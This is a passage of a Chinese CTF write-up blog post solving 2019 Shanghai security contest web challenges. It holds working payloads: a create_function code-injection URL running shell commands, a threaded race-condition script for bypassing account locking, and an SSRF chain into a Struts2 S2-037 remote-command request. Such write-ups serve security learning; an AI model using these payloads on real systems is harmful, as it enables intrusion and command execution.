<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /var/www/html/m4nag3r_u_dont_know/index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">create_function($_REQUEST[<span class="string">'func'</span>],<span class="string">'flag'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后就是create_function代码注入了<br><a href="http://xxxx//m4nag3r_u_dont_know/?func=){}system(%27ls%20/%27);//" target="_blank" rel="noopener">http://xxxx//m4nag3r_u_dont_know/?func=){}system(%27ls%20/%27);//</a></p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/33.png" alt="33"></p>
<p><a href="http://xxxx//m4nag3r_u_dont_know/?func=){}system(%27cat%20/flag_e10adc3949ba59abbe56e057f20f883e%27);//" target="_blank" rel="noopener">http://xxxx//m4nag3r_u_dont_know/?func=){}system(%27cat%20/flag_e10adc3949ba59abbe56e057f20f883e%27);//</a></p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/34.png" alt="34"></p>
<h2 id="cat-market"><a href="#cat-market" class="headerlink" title="cat market"></a>cat market</h2><p>一开始，我们会发现证书有问题，而且无法正常访问网站。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/35.png" alt="35"></p>
<p>我们需要修改本地host，将where_is_my_cat.ichunqiu.com指向题目地址。在COOKIE中还会看到HOST字段，也把它设置成where_is_my_cat.ichunqiu.com，然后就可以正常访问网站了。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/36.png" alt="36"></p>
<p>我们会发现网站底部有一个/source_code_version_1.tgz ，下下来审计。这里主要发现两个漏洞点。</p>
<p><strong>第一个点：竞争漏洞</strong> </p>
<p>首先我们看下面注册和登录两段代码，注册的时候会执行两条SQL语句，其中一条会将locked字段设置为1。而登录的时候，会判断用户所对应的locked字段。如果为1，则表示用户被锁定并直接退出程序。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/37.png" alt="37"></p>
<p>这样看来，好像我们即使注册了用户，也无法登录进去。但是，如果我们开启多个线程同时注册登录，那么就有可能登录进去，这就利用了竞争漏洞。我们在对数据进行增删改的时候，要给它加一把锁，避免此时用户读到脏数据（本该读取修改后的值，却读取了修改前的值）。关于竞争漏洞的解释，还可以参考这篇文章： <a href="https://seaii-blog.com/index.php/2017/04/26/49.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2017/04/26/49.html</a> </p>
<p>而上面的代码，我们可以通过多线程的方式，同时进行注册和登录，在执行update locked之前查询用户的 locked 字段，，从而拿到用户的cookie信息。具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line"><span class="keyword">import</span> threading,random</span><br><span class="line">reg_url = <span class="string">"https://where_is_my_cat.ichunqiu.com:8006/checkregister.php"</span></span><br><span class="line">log_url = <span class="string">"https://where_is_my_cat.ichunqiu.com:8006/checklogin.php"</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">"HOST"</span> : <span class="string">"where_is_my_cat.ichunqiu.com"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span> : username,</span><br><span class="line">        <span class="string">"password"</span> : password,</span><br><span class="line">        <span class="string">"code"</span> : int(time.time())</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=reg_url, data=data, cookies=cookies, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span> : username,</span><br><span class="line">        <span class="string">"password"</span> : password,</span><br><span class="line">    &#125;</span><br><span class="line">    s = requests.session()</span><br><span class="line">    r = s.post(url=log_url, data=data, cookies=cookies, verify=<span class="literal">False</span>)</span><br><span class="line">    print(<span class="string">"===============================================================\n"</span>)</span><br><span class="line">    print(r.cookies)</span><br><span class="line">    print(<span class="string">"===============================================================\n\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    username = <span class="string">"moch33"</span> + str(random.randint(<span class="number">1</span>,<span class="number">100000</span>))</span><br><span class="line">    threading.Thread(target=register, args=(username,<span class="string">"mochazz"</span>)).start()</span><br><span class="line">    threading.Thread(target=login, args=(username,<span class="string">"mochazz"</span>)).start()</span><br></pre></td></tr></table></figure>

<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/38.png" alt="38"></p>
<p><strong>第二个点：SSRF</strong> </p>
<p>在market.php文件中，有一处重定向，我们只需要绕过is_cat函数中的规则，即可利用这个功能进行SSRF。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/39.png" alt="39"></p>
<p>而且redirect.php中还存在一个重定向，刚好可以结合绕过上面的规则限制。规则要求url以图片格式结尾，我们可以使用 <code>?、#、&amp;</code> 等等符号来绕过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// redirect.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'u'</span>]))&#123;</span><br><span class="line">    header(<span class="string">"Location: "</span>.$_GET[<span class="string">'u'</span>].<span class="string">".php"</span>);</span><br><span class="line">    $log = date(<span class="string">"Y-m-d H:i:s"</span>).<span class="string">" : "</span>.$_SERVER[REMOTE_ADDR].<span class="string">" redirect to: "</span>.$_GET[<span class="string">'u'</span>].<span class="string">".php\n\r"</span>;</span><br><span class="line">    file_put_contents(<span class="string">"log.txt"</span>,$log,FILE_APPEND);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来可以开始探测一波常用端口，看看上面有没其他web服务，然后会发现8080端口上运行这tomcat+struts2。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/40.png" alt="40"></p>
<p>测一下Struts的漏洞，发现S2-037可用。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/41.png" alt="41"></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/market.php?url=https://where_is_my_cat.ichunqiu.com/redirect.php%3Fu%3Dhttp%253A//127.0.0.1%253A8080/struts2-rest-showcase/orders/3/%2528%252523_memberAccess%25253d%2540ognl.OgnlContext%2540DEFAULT_MEMBER_ACCESS%2529%25253f%2528%252523wr%25253d%252523context%25255b%252523parameters.obj%25255b0%25255d%25255d.getWriter%2528%2529%252C%252523rs%25253d%2540org.apache.commons.io.IOUtils%2540toString%2528%2540java.lang.Runtime%2540getRuntime%2528%2529.%252565%252578%252565%252563%2528%252523parameters.command%255B0%255D%2529.getInputStream%2528%2529%2529%252C%252523wr.println%2528%252523rs%2529%252C%252523wr.flush%2528%2529%252C%252523wr.close%2528%2529%2529%253Axx.toString.json%253F%2526obj%253Dcom.opensymphony.xwork2.dispatcher.HttpServletResponse%2526content%253D233%2526command%253Dcat%252520/flag%2526%23mochazz.jpg</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: where_is_my_cat.ichunqiu.com:8006</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=fkotbsvfhbdrfbjotnhbtriuq0; HOST=where_is_my_cat.ichunqiu.com</span><br></pre></td></tr></table></figure>

</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Mochazz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://mochazz.github.io/2019/06/14/2019神盾杯上海市网络安全竞赛Web题解/">https://mochazz.github.io/2019/06/14/2019神盾杯上海市网络安全竞赛Web题解/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://mochazz.github.io">Mochazz's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/06/19/2019强网杯线下Web题解/"><i class="fa fa-chevron-left">  </i><span>2019强网杯线下Web题解</span></a></div><div class="next-post pull-right"><a href="/2019/05/31/ThinkPHP5漏洞分析之代码执行8/"><span>ThinkPHP5漏洞分析之代码执行(八)</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'cFxDjSziPHq4xGCbSpRGkND7-gzGzoHsz',
  appKey:'YhJIRxQHzY9Aix5pSGnYxKkv',
  placeholder:'ヾﾉ≧∀≦)o留下评论再走吧',
  avatar:'wavatar',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(/img/backgroud.jpeg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By Mochazz</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>